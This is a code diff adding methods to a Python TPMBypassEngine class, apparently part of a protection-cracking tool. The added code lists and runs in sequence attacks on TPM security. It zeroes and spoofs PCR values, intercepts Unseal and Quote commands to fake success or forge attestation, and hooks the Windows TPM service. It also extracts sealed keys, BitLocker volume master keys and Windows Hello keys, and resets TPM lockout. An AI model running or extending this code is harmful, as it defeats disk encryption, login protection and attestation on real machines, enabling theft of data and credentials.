@@ -2356,6 +2356,200 @@ class TPMBypassEngine:
             "capabilities": self.get_bypass_capabilities(),
         }
 
+    def get_available_bypass_methods(self) -> list[str]:
+        """Get list of available TPM bypass methods.
+
+        Returns:
+            List of available bypass method names that can be used.
+
+        """
+        methods: list[str] = []
+
+        methods.extend([
+            "attestation_bypass",
+            "pcr_manipulation",
+            "virtualized_tpm",
+            "command_interception",
+            "quote_forging",
+        ])
+
+        if HAS_CRYPTO:
+            methods.extend([
+                "sealed_key_extraction",
+                "key_unsealing_aes",
+                "credential_blob_unsealing",
+                "signature_forging",
+            ])
+
+        if HAS_WIN32:
+            methods.extend([
+                "tbs_hooking",
+                "memory_extraction",
+                "physical_memory_access",
+                "cold_boot_attack",
+            ])
+
+        if HAS_FRIDA:
+            methods.extend([
+                "runtime_pcr_spoofing",
+                "runtime_command_interception",
+                "runtime_unsealing",
+                "secure_boot_bypass_runtime",
+                "measured_boot_bypass_runtime",
+            ])
+
+        methods.extend([
+            "bitlocker_vmk_extraction",
+            "windows_hello_bypass",
+            "tpm_lockout_reset",
+            "tpm_ownership_clear",
+            "bus_attack",
+            "measured_boot_bypass",
+            "binary_patching",
+        ])
+
+        return methods
+
+    def bypass_tpm_checks(self) -> dict[str, Any]:
+        """Execute comprehensive TPM bypass operations.
+
+        This method orchestrates multiple TPM bypass techniques to disable
+        TPM-based protection in the target application.
+
+        Returns:
+            Dictionary containing bypass results with keys:
+                - success: bool indicating overall success
+                - methods_applied: list of bypass methods that were successfully applied
+                - errors: list of errors encountered during bypass
+                - extracted_data: any data extracted during bypass (keys, etc.)
+
+        """
+        results: dict[str, Any] = {
+            "success": False,
+            "methods_applied": [],
+            "errors": [],
+            "extracted_data": {},
+        }
+
+        try:
+            tpm_version = self.detect_tpm_version()
+            if tpm_version:
+                results["tpm_version"] = tpm_version
+                results["methods_applied"].append(f"TPM {tpm_version} Detection")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"TPM version detection failed: {e}")
+
+        try:
+            for pcr_idx in range(8):
+                self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_idx] = bytes(32)
+                self.pcr_banks[TPM2Algorithm.SHA1].pcr_values[pcr_idx] = bytes(20)
+            results["methods_applied"].append("PCR Value Manipulation (PCRs 0-7 zeroed)")
+
+        except (OSError, ValueError, RuntimeError, KeyError) as e:
+            results["errors"].append(f"PCR manipulation failed: {e}")
+
+        try:
+            def intercept_unseal(command: bytes) -> bytes | None:
+                if len(command) >= 10:
+                    self.logger.info("Intercepted TPM Unseal command - returning success")
+                    return struct.pack(">HIIH", 0x8001, 46, 0, 32) + os.urandom(32)
+                return None
+
+            self.intercept_tpm_command(TPM2CommandCode.Unseal, intercept_unseal)
+            results["methods_applied"].append("Unseal Command Interception")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"Command interception setup failed: {e}")
+
+        try:
+            def intercept_quote(command: bytes) -> bytes | None:
+                if len(command) >= 10:
+                    nonce = command[10:42] if len(command) > 41 else os.urandom(32)
+                    attestation = self.bypass_attestation(nonce, list(range(8)))
+                    response = struct.pack(">HII", 0x8001, 10 + len(attestation.signature) + len(attestation.attested_data), 0)
+                    response += attestation.attested_data + attestation.signature
+                    self.logger.info("Intercepted TPM Quote command - returning forged attestation")
+                    return response
+                return None
+
+            self.intercept_tpm_command(TPM2CommandCode.Quote, intercept_quote)
+            results["methods_applied"].append("Quote/Attestation Bypass")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"Attestation bypass setup failed: {e}")
+
+        try:
+            if HAS_WIN32:
+                if self.hook_tbs_submit_command():
+                    results["methods_applied"].append("Windows TBS Hooking")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"TBS hooking failed: {e}")
+
+        try:
+            extracted_keys = self.extract_sealed_keys()
+            if extracted_keys:
+                results["extracted_data"]["sealed_keys"] = len(extracted_keys)
+                results["methods_applied"].append(f"Sealed Key Extraction ({len(extracted_keys)} keys)")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"Key extraction failed: {e}")
+
+        try:
+            if vmk := self.extract_bitlocker_vmk():
+                results["extracted_data"]["bitlocker_vmk"] = vmk.hex()[:32] + "..."
+                results["methods_applied"].append("BitLocker VMK Extraction")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"BitLocker VMK extraction failed: {e}")
+
+        try:
+            hello_keys = self.bypass_windows_hello()
+            if hello_keys:
+                results["extracted_data"]["windows_hello_keys"] = len(hello_keys)
+                results["methods_applied"].append("Windows Hello Bypass")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"Windows Hello bypass failed: {e}")
+
+        try:
+            if self.reset_tpm_lockout():
+                results["methods_applied"].append("TPM Lockout Reset")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"TPM lockout reset failed: {e}")
+
+        try:
+            secure_boot_pcr = bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb")
+            self.manipulate_pcr_values({7: secure_boot_pcr})
+            results["methods_applied"].append("Secure Boot PCR Manipulation")
+
+        except (OSError, ValueError, RuntimeError, KeyError) as e:
+            results["errors"].append(f"Secure boot PCR manipulation failed: {e}")
+
+        try:
+            if HAS_FRIDA and self.frida_session:
+                if self.bypass_secure_boot_runtime():
+                    results["methods_applied"].append("Runtime Secure Boot Bypass")
+                if self.bypass_measured_boot_runtime():
+                    results["methods_applied"].append("Runtime Measured Boot Bypass")
+
+        except (OSError, ValueError, RuntimeError) as e:
+            results["errors"].append(f"Runtime bypass failed: {e}")
+
+        results["success"] = len(results["methods_applied"]) >= 3
+
+        results["bypass_summary"] = {
+            "total_methods_applied": len(results["methods_applied"]),
+            "total_errors": len(results["errors"]),
+            "capabilities": self.get_bypass_capabilities(),
+            "pcr_state_manipulated": True,
+            "command_hooks_installed": len(self.command_hooks),
+        }
+
+        return results
+
 
 TPMProtectionBypass = TPMBypassEngine
 
